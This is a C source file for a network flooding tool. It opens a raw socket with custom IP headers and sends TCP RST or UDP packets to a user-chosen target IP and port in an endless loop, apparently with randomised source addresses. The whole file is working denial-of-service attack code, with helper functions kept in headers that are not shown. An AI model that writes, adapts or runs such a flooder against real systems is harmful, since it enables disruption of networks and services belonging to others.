#include <netinet/ip.h>
#include <stdio.h>
#include <sys/socket.h>
#include <time.h>
#include "options.h"

void flood(struct packet_settings *settings)
{
	int enable = 1;
	// Create a raw network socket
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock == -1)
		crash("Error opening a socket!");

	// Set Socket option to let us create IP header ourselves:
	int sockopt = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	if (sockopt == -1)
		crash("Error setting socket options!");
	// Provide destination information:
	struct sockaddr_in dest_info; // Store target address for the raw socket
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr.s_addr = inet_addr(settings->target_ip_address);
	
	// 'packet' is the buffer to store the packet in.
	// 40 bytes is the maximum packet size in our program (IP header size (20) + TCP header size (20))
	char packet[40];

	char attack_type[15];
	strcpy(attack_type, (settings->protocol == IPPROTO_TCP) ? "TCP RST flood" : "UDP flood");
	
	printf("Attacking %s:%d with %s, Press Ctrl+C to stop...\n"
					, settings->target_ip_address, settings->target_port, attack_type);
	// We enter an infinite loop to flood the target:
		while(1)
		{	
			memset(packet, 0, 40); // Init packet with zeros every time to create a new packet

			create_packet(packet, settings); // Create a new packet and store it in 'packet'

			struct iphdr *iph = (struct iphdr*)packet; // Create an IP Header pointer for readability reasons

			sendto(sock, iph, iph->tot_len, 0, (struct sockaddr *)&dest_info, sizeof(dest_info)); // Send out the packet
		}

	close(sock);
}

int main(int argc, char *argv[])
{
	// Initialize random seed to current time so that IP addresses will be different each time the program is running.
    srand(time(NULL));

	// 'packet_settings' is the struct we keep our packet settings in.
	// For more information, check out 'packets.h' 
	struct packet_settings settings;

	// Initialize 'settings' and analyze/set user input:
	memset(&settings, 0, sizeof(struct packet_settings));
	set_options(argc, argv, &settings);

	//Begin flooding process:
	flood(&settings);
		
	return 0;
	
}